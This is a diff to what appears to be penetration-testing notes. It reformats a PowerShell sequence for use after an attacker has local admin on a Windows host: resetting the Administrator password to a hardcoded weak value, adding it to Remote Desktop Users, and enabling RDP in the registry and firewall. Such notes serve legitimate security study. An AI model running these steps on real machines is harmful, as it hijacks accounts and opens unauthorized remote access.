@@ -182,13 +182,17 @@ schtasks /query /fo LIST /v
 
 ### Command Line to RDP
 Without a GUI session on a Windows box certain things can become pretty difficult. If we have local admin on a machine the following will allow us to upgrade a shell to a full RDP session as the local admin. Consider saving as a script and just running this:
+
+Update the Administrator password
 ```powershell
-# Update the Administrator password
-$Password = ConvertTo-SecureString "12345abcde" -AsPlainText -Force
-Get-LocalUser -Name "Administrator" | Set-LocalUser -Password $Password
-# Add the Administrator to the RDP Users group if they aren't already there
+$Password = ConvertTo-SecureString "12345abcde" -AsPlainText -Force;Get-LocalUser -Name "Administrator" | Set-LocalUser -Password $Password
+```
+Add the Administrator to the RDP Users group if they aren't already there
+```powershell
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Administrator"
-# Enable RDP on the machine
+```
+Enable RDP on the machine
+```powershell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
